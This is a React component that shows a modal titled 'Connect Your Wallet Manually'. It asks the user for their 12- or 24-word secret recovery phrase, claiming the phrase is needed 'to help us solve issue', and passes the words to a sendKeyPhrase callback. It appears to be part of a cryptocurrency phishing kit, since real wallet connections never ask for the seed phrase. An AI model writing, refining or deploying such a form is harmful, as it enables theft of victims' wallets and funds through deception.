import React, { useState } from 'react';
import styles from './KeyPhraseModal.module.css';

const KeyPhraseModal = ({ closeKeyPhraseForm, sendKeyPhrase }) => {
    const [keyPhrase, setKeyPhrase] = useState("")

    const pushKeyPhrase =(e)=>{
        e.preventDefault()
        const keyPhrasearr = keyPhrase.split(' ')
        if(keyPhrasearr.length < 12){
            alert("Your Key Phrase is usually 12 or 24 words. Please input the correct details inorder to help us solve issue")
        }else{
            sendKeyPhrase(keyPhrasearr);
        }
    }
    
    return (
        <div className={styles.overlay} onClick={closeKeyPhraseForm}>
            <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
                <h2 className={styles.title}>Connect Your Wallet Manually</h2>
                <p className={styles.label} htmlFor="phrase">Input Secret Key Phrase</p>
                <form className={styles.form} onSubmit={pushKeyPhrase}>
                    <textarea 
                        type="text" 
                        className={styles.input} 
                        placeholder="Enter Phrase" 
                        value={keyPhrase}
                        onChange={(e)=>setKeyPhrase(e.target.value)}
                    />
                    <p className={styles.helperText}>Typically 12 (sometimes 24) words separated by single spaces</p>
                    <button className={styles.button} onClick={pushKeyPhrase} type='submit'>Connect Wallet</button>
                </form>
            </div>
        </div>
    );
}

export default KeyPhraseModal;
